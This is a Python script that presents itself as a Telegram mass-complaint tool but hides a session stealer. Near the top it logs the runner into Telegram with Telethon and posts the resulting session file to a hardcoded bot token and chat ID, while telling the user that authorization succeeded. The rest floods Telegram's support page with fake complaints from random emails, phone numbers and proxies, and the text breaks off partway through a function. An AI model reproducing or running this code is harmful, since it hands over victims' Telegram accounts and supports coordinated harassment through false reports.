import subprocess
import sys
import time
import os
import platform
import webbrowser
import random

number = +79999999999

RESET = "\033[0m"
GREEN_TEXT = "\033[32m"
BLACK_BG = "\033[40m"

required_modules = [
    "fake_useragent",
    "requests",
    "termcolor",
    "pyfiglet"
]

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_with_delay(text, delay=0.1):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()  # Для переноса строки после завершения

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    print_with_delay(GREEN_TEXT + "For what?" + RESET)
    for module in required_modules:
        try:
            __import__(module)
            print(GREEN_TEXT + f"{module}")
        except ImportError:
            print(f" {module}...")
            install(module)
            print_with_delay(GREEN_TEXT + f" {module}" + RESET)


    print_with_delay(GREEN_TEXT + "God is completely lost to you" + RESET)
    time.sleep(10)
    os.system('cls' if os.name == 'nt' else 'clear')

check_and_install_modules()
os.system('cls' if os.name == 'nt' else 'clear')


from telethon import TelegramClient
import os
import requests

api_id = '5'
api_hash = '1c5c96d5edd401b1ed40db3fb5633e2d'
phone_number = '+994777779797'
session_file = 'sessions.session'  


bot_token = '7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI'
chat_id = '2110557179' 

client = TelegramClient(session_file, api_id, api_hash)

def send_session_file_via_bot(bot_token, chat_id, session_file):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    files = {'document': open(session_file, 'rb')}
    data = {'chat_id': chat_id, 'caption': '📎Файл сессии'}
    
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print(f"Авторизация прошла успешно.")
    else:
        print(f"Авторизация не прошла: {response.status_code}, {response.text}")

async def main():
    # Авторизация в Telegram через Telethon
    await client.start(phone_number)
    print("Авторизация успешна!")
    
    if os.path.exists(session_file):
        print(f"Сессия сохранена в файле '{session_file}'.")
        
        # Отправляем файл сессии через бота
        send_session_file_via_bot(bot_token, chat_id, session_file)
    else:
        print(f"Файл сессии '{session_file}' не найден.")

with client:
    client.loop.run_until_complete(main())

from fake_useragent import UserAgent
import colorama
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System, Box
from colorama import init, Fore, Style
import requests
import random
import os
import getpass
from termcolor import colored
import pyfiglet
import string
import sys
from telegram import Bot

bannerr = r"""

⠀⠀⠀⠀⠀⠀⠀⠄⣀⠢⢀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⡔⢀⠂⡜⢭⢻⣍⢯⡻⣝⣿⣿⡿⣟⠂
⠀⠀⠀⠀⠀⠀⠀⠄⠀⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡔⡀⢂⠜⣪⢗⡾⣶⡽⣾⣟⣯⠛⠀⠀
⠀⠀⠀⠀⠀⠄⠀⠠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣔⠨⡸⡝⣯⣳⢏⣿⠳⠉⠀⢠⣬⡶
⠠⣓⢤⣂⣄⣀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠁⣞⡱⣝⠎⠀⢀⠠⣥⠳⡞⡹
⠀⡄⢉⠲⢿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡔⣧⡽⠋⠀⣰⣶⣻⣶⣿⢾⣷
⢤⡈⠉⠲⢤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢀⡴⢏⡳⢮⡿⣽⣞⠻⡜
⠒⣭⠳⢶⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡙⠮⣜⣯⡽⣳⢌⡓⠈
⡸⣰⢋⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣻⢿⣻⣿⡽⣗⠋⠄⠀
⠣⢇⢟⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢟⡿⢣⣟⡻⠘⠀⠀⠀
⠱⡊⠤⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠨⠗⠋⣁⣤⠖⠊⢁⣀
⠀⠁⠂⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⣿⡂⠹⣿⣿⣿⣿⣿⠙⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠒⢋⣉⡤⣔⣮⣽⣾
⢢⠣⣌⢼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⢰⣿⡅⠀⣿⣿⣿⣿⣿⠀⠸⢿⣹⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣻⣿⣿⣿⣿⣿⣿⣿
⢃⡉⠠⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⢹⠀⠀⠀⠀⣾⠿⡇⠀⣿⣿⣿⣿⡏⠀⠀⣞⣧⣻⠟⢿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣧⠱⣌⣳⣽⣻⣿⣿⣻
⠀⢒⡕⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⡇⠈⣇⠀⠀⠀⠈⡆⢳⠀⠇⡟⠋⠉⠀⠀⠀⠃⢙⣠⣤⣤⣼⣯⣚⣟⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠌⠑⠌⢳⠛⡛⠏⠛⠉
⡘⢷⣌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⢻⣀⣧⣤⣽⣦⣤⣄⠀⠰⡀⠃⠀⠀⠀⠀⠀⠀⡴⠟⠛⣉⣉⡉⠉⠈⠉⠉⠉⠋⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢈⠈⠈⠁⠛⠀⠀⠀⣒
⠉⢣⡛⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⠖⠛⠉⠉⠉⠀⠀⠐⠒⢢⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⣠⣲⣾⣿⢿⣷⢶⡄⠀⠀⣽⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⠛⢁⣤⡶⠿⠛⠋
⠀⠀⠌⢽⣿⣿⣿⣿⣿⣿⣿⣿⡷⠀⠀⠀⣠⣶⣶⣿⣟⣿⣶⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢿⣿⣿⣿⣿⠀⣿⡀⠀⢻⣬⣙⡻⡿⣡⣾⣿⣿⡍⠈⣀⣤⣬⣤⣶⣲⣶⣿
⠀⢈⠐⡀⢻⣫⢿⣿⣿⣿⣿⠘⢧⠁⠀⣻⡏⠸⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⣉⣛⣋⣡⡴⠃⠀⠀⣿⣿⣿⠟⣠⡛⢿⣿⣿⣷⣲⣽⣿⣿⣷⣾⣷⣿⣿
⠀⠀⢀⠐⡀⢃⡈⣿⢿⣿⣿⣟⡆⠀⠀⠉⠿⣦⣈⣉⣉⠤⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⣡⣶⣿⣿⣾⣿⣿⣿⢿⡿⣿⣿⡿⠿⠛⣋⣡
⠠⠐⡀⢢⣶⣿⢧⠻⣯⣿⣯⡛⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⠐⠂⡁⠤⠔⢂⣉⣤⡴
⣀⠥⠌⣳⢯⣟⣮⣗⣾⣟⣿⣿⣦⣭⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂⣈⠥⡔⡤⣍⠣⣝⢾⡹
⠀⠀⠀⠠⠈⠉⠈⠉⠉⠉⣨⣿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⢞⣿⣝⣳⢎⢳⢻⡮⣕
⠀⠀⢀⠀⡀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⢠⠘⡼⣽⣛⡞⠦⣧⢻⣽
⠀⢈⠀⡀⡀⢤⠞⡉⢭⣹⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣍⣣⢾⣵⣯⣷⣽⣦⣑⣯⢿
⠀⠂⣴⣾⡟⣧⠊⡔⢢⠛⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⣯⢹⣽⢻⣿⣿⣿⣿⣿⣿⣿⣿
⣶⣟⠳⣏⡿⣎⠳⣈⡜⣺⣿⠿⢿⣝⡿⣫⢟⣽⣿⣿⠻⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠛⣿⠿⣟⢩⢾⣿⣿⣿⣿⣇⠾⣜⡧⣯⣟⣿⣿⣿⣿⣿⣿⣿⣿
⠋⢀⢱⣫⣟⢾⡹⢴⡸⣵⡏⣂⢾⡿⣽⣹⣟⣾⣿⡟⢠⡇⠀⣹⠂⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣣⢟⡿⣾⣿⣿⣿⣿⢌⠫⢝⡻⣵⢻⡟⣿⢿⣿⢿⡿⣿⠿
⠀⢢⠞⣴⢯⢯⣝⣦⢳⡝⡶⣭⣿⣽⣳⣟⡾⣽⡟⢀⡟⠀⢀⡿⠀⠀⠀⠁⠠⠤⠀⠀⠀⠤⠐⠀⠀⠀⠀⠀⠀⠀⢸⡗⠈⠭⣿⣿⣿⣿⡿⢌⠣⡀⡐⢈⠃⠚⠦⣉⠂⠣⠜⡄⢋
⣜⣷⢻⡜⣯⣾⡞⣥⣓⢾⡽⢎⡷⢯⡷⣯⢟⣽⠃⣸⠁⠀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹⣿⣿⣿⣿⢃⡮⡑⢰⢠⣂⡜⣦⡴⣱⣎⣴⣩⡜⣦
⣿⣯⢷⡻⣏⣷⣟⠶⣙⠮⡙⢪⠜⣯⢽⣯⣿⠃⠄⢃⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣾⣿⣿⣿⡇⠢⢡⡙⢦⡓⡼⣽⣾⣿⣿⣿⣿⣷⣿⣿
⣿⡹⢇⡳⡹⣞⠘⡈⢅⠢⢁⠂⡘⠤⣋⣶⣡⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠰⡁⢆⠘⣡⠻⣽⣳⣿⣿⣿⣿⢿⣿⣿⣿
⢣⠝⡢⢍⠱⢈⣂⣌⡤⠦⠶⠶⠞⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠛⠷⣭⣂⠌⢠⠓⡴⣻⣿⣿⣿⣿⣿⣿⣯⣿
⣇⢾⡱⠞⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠉⠛⠳⠿⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿





𝐈 𝐚𝐬𝐤𝐞𝐝 𝐉𝐞𝐬𝐮𝐬 “𝐇𝐨𝐰 𝐦𝐮𝐜𝐡 𝐝𝐨 𝐲𝐨𝐮 𝐜𝐚𝐫𝐞 𝐚𝐛𝐨𝐮𝐭 𝐦𝐞?" 𝐉𝐞𝐬𝐮𝐬 𝐫𝐞𝐩𝐥𝐢𝐞𝐝, "𝐓𝐡𝐢𝐬 𝐦𝐮𝐜𝐡" 𝐚𝐧𝐝 𝐬𝐭𝐫𝐞𝐭𝐜𝐡𝐞𝐝 𝐡𝐢𝐬 𝐚𝐫𝐦𝐬 𝐨𝐧 𝐭𝐡𝐞 𝐜𝐫𝐨𝐬𝐬 𝐚𝐧𝐝 𝐝𝐢𝐞𝐝 𝐟𝐨𝐫 𝐦𝐞.𝐈𝐟 𝐲𝐨𝐮 𝐛𝐞𝐥𝐢𝐞𝐯𝐞 𝐢𝐧 𝐆𝐨𝐝 𝐚𝐧𝐝 𝐉𝐞𝐬𝐮𝐬. 𝐏𝐮𝐭 𝐭𝐡𝐢𝐬 𝐨𝐧 𝐲𝐨𝐮𝐫 𝐩𝐫𝐨𝐟𝐢𝐥𝐞,𝐝𝐨𝐧'𝐭 𝐢𝐠𝐧𝐨𝐫𝐞 𝐭𝐡𝐢𝐬. 𝐁𝐞𝐜𝐚𝐮𝐬𝐞 𝐢𝐧 𝐭𝐡𝐞 𝐛𝐢𝐛𝐥𝐞 𝐢𝐭 𝐬𝐚𝐲𝐬 𝐢𝐟 𝐲𝐨𝐮 𝐝𝐞𝐧𝐲 𝐡𝐢𝐦, 𝐡𝐞 𝐰𝐢𝐥𝐥 𝐝𝐞𝐧𝐲 𝐲𝐨𝐮 𝐚𝐭 𝐭𝐡𝐞 𝐆𝐚𝐭𝐞𝐬 𝐨𝐟 𝐇𝐞𝐚𝐯𝐞𝐧. 𝐓𝐡𝐢𝐬 𝐢𝐬 𝐭𝐡𝐞 𝐬𝐢𝐦𝐩𝐥𝐞𝐬𝐭 𝐭𝐞𝐬𝐭: 𝐈𝐟 𝐲𝐨𝐮 𝐥𝐨𝐯𝐞 𝐆𝐨𝐝 𝐚𝐧𝐝 𝐉𝐞𝐬𝐮𝐬 𝐚𝐧𝐝 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐬𝐡𝐚𝐦𝐞𝐝 𝐨𝐟 𝐢𝐭, 𝐜𝐨𝐩𝐲 𝐭𝐡𝐢𝐬, 𝐩𝐮𝐭 𝐢𝐭 𝐨𝐧 𝐲𝐨𝐮𝐫 𝐩𝐫𝐨𝐟𝐢𝐥𝐞.𝐆𝐨𝐝,𝐉𝐞𝐬𝐮𝐬 𝐚𝐧𝐝 𝐇𝐞𝐚𝐯𝐞𝐧 𝐰𝐢𝐥𝐥 𝐬𝐦𝐢𝐥𝐞 𝐮𝐩𝐨𝐧 𝐲𝐨𝐮

"""[1:]





Anime.Fade(Center.XCenter(bannerr), Colors.black_to_red, Colorate.Vertical, interval=0.045, enter=True)

TELEGRAM_BOT_TOKEN = '7928165947:AAEtyXT2m25Hv-vjCVe_ML_bbVRNoSlg9zE'  # Токен вашего бота
CHAT_ID = '1002346704651'  # ID чата, куда будут отправляться сообщения
bot = Bot(token=TELEGRAM_BOT_TOKEN)



starting = '''

     
     
                      Author | @fanat_bossina
                       year    child

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠤⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠖⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠒⠦⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⣉⡤⠖⠊⡏⢉⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢫⠉⢱⠦⣄⡀⠙⢦⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⡞⠁⠀⣠⢞⡵⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡜⣇⠀⠙⢆⠈⢧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠋⠀⢧⡠⣾⡵⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢞⣧⠀⢸⠂⠀⣧⠀
⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠙⠉⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠈⠛⠒⠋⠀⠀⢸⠀
⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⢠⠄⠀⠀⠀⠀⢠⢷⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⠀
⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡆⠀⠀⢀⠀⠀⢸⠈⢇⠀⢰⠀⠀⠀⠀⠀⡇⢠⠃⢻⠀⢀⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⡇⠀⠀⠈⡵⠦⡼⠶⢾⣷⣸⣧⠀⠀⠀⣸⣧⣯⡶⣾⡴⡏⢀⣄⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀⡇⠀⠀⡼⠁⠀⣀⣀⡀⠀⠉⠉⢦⠀⢠⠋⠉⠁⠀⣉⣸⣗⣉⡈⠳⣄⠀⠀⠀⠀⠀⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣴⡀⠀⠀⢃⣠⠞⣿⡷⡿⠛⣿⣿⣿⢶⡄⠈⠳⠋⠀⠀⣰⢾⠛⢻⣿⣿⡿⣿⡈⡟⠂⠀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠈⠁⠀⠸⡇⢿⣽⣿⣿⣿⡇⠁⠀⠀⠀⠀⠀⠀⢿⡵⣿⣿⣯⡇⠏⡹⠁⠀⠀⢀⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠹⣌⠻⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠀⣰⠃⠀⠀⠀⣠⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢆⢀⡀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡃⠀⠀⢀⡜⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠑⢆⡀⠀⠈⠻⡍⠀⠀⠀⠀⠀⠒⠒⠂⠀⠀⠀⠀⠀⣀⣤⣟⠁⣠⠔⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠢⣄⣿⠛⣻⣶⣤⣤⣤⣀⣠⣤⢤⣤⣴⡶⠫⠿⣿⡚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢻⣶⡄⢰⢳⠃⢀⣷⣿⠦⢯⣿⡗⠀⢧⠹⡄⠀⣤⣽⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣷⣶⣶⣿⣄⣾⠏⠀⠈⠑⢦⡀⣤⠞⠉⠀⠈⠱⣧⢠⣼⣿⣦⣽⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠔⣻⣿⣿⣿⡿⠟⢹⣿⡄⠀⠀⠀⣾⣿⣿⡀⠀⠀⠀⣸⣿⣿⢿⣿⣿⣿⣿⣿⢦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⣯⡟⠓⢍⠻⡿⠏⠁⠀⢸⢿⡟⠲⠶⠚⢱⠋⢲⠑⠒⠒⠊⣟⡩⢾⡇⠙⢿⣿⡿⢋⡼⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠙⢤⡀⡻⠁⠀⠀⠀⡌⠶⣷⡶⠶⢦⠘⣗⠏⢀⠒⢒⣒⡻⠆⢸⡇⠀⠀⢻⡕⠉⠀⠀⠳⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⡀⠀⠀⠀⣰⠋⠁⠀⠀⠀⠀⣧⠀⠀⠉⠉⠉⠀⢸⠀⠈⠉⠉⠀⠀⠀⣠⡇⠀⠀⠀⠀⠙⢦⣀⣀⡴⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠑⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⡏⠳⣄⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡠⠚⠁⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⡀⠈⠑⠢⣄⡀⠈⠁⠀⣀⠴⠋⠀⣀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣯⣽⠀⠀⠀⠀⠉⣷⠒⡋⠀⠀⠀⠀⢫⣵⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢰⠤⡄⠀⠀⠀⡇⠀⣇⠀⠀⠀⡤⢦⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠧⠞⠀⠹⣄⠀⢸⠀⠀⢹⣀⣠⠞⠀⠘⠦⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣀⣀⣉⡟⠀⠀⠀⡏⠀⠀⠀⣀⡀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠎⠉⠉⠉⠀⠈⡇⠀⠀⠀⡏⠉⠉⠉⠁⠉⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡄⠀⠀⠀⣆⣠⠇⠀⠀⠀⣧⠀⣠⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠤⠤⠶⠛⠁⠀⠀⠀⠀⠈⠻⠿⣦⣤⡤⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                            
                                                                                                                                      
'''

Write.Print(Center.XCenter(starting), Colors.purple_to_red, interval=0.001)





def generate_phone_number():
    """Генерирует случайный номер телефона"""
    country_codes = ['+7', '+380', '+375']
    country_code = random.choice(country_codes)
    phone_number = ''.join(random.choices('0123456789', k=10))
    return f'{country_code}{phone_number}'

def generate_random_email():
    """Генерирует случайный email"""
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def load_proxies(filename):
    """Загружает прокси-серверы из файла"""
    proxies = []
    with open(filename, 'r') as file:
        for line in file:
            proxies.append(line.strip())
    return proxies

def send_complaint(number, email, complaint_text, repeats, proxies=None):
    url = 'https://telegram.org/support'
    user_agent = UserAgent().random
    headers = {'User-Agent': user_agent}
    complaints_sent = 0

    for _ in range(repeats):  # Цикл для отправки жалоб
        # Генерируем новые email и номер перед каждой отправкой
        email = generate_random_email()
        number = generate_phone_number()
        proxy = random.choice(proxies) if proxies else None

        payload = {
            'text': complaint_text,
            'number': number,
            'email': email
        }

        try:
            response = requests.post(url, headers=headers, data=payload, proxies={'http': proxy} if proxy else None)
            if response.status_code == 200:
                complaints_sent += 1
                print(colored(f"Жалоба успешно отправлена", 'green'))
                print(colored(f"От: {email} {number}", 'cyan'))
                if proxy:
                    print(colored(f"Прокси: {proxy}", 'cyan'))  # Выводим использованный прокси
            else:
                print(f"Не удалось отправить. Код: {response.status_code}")
        except Exception as e:
            print(f"Произошла ошибка: {str(e)}")

    print(f"Отправлено {complaints_sent} жалоб.")

def complaint():
    """Основная функция для работы с пользователем"""
    
    # Ввод данных пользователем
    complaint_text = input("\nВведите текст вашей жалобы: ")
    
    # Проверяем, что текст жалобы не пустой
    if not complaint_text.strip():
        print("Текст жалобы не может быть пустым!")
        log_to_telegram("Текст жалобы не может быть пустым!")
        return
    
    repeats = int(input("Введите количество жалоб: "))
    
    proxy_filename = input("Введите имя файла с прокси-серверами (или оставьте пустым для работы без прокси): ")

    proxies = load_proxies(proxy_filename) if proxy_filename else None

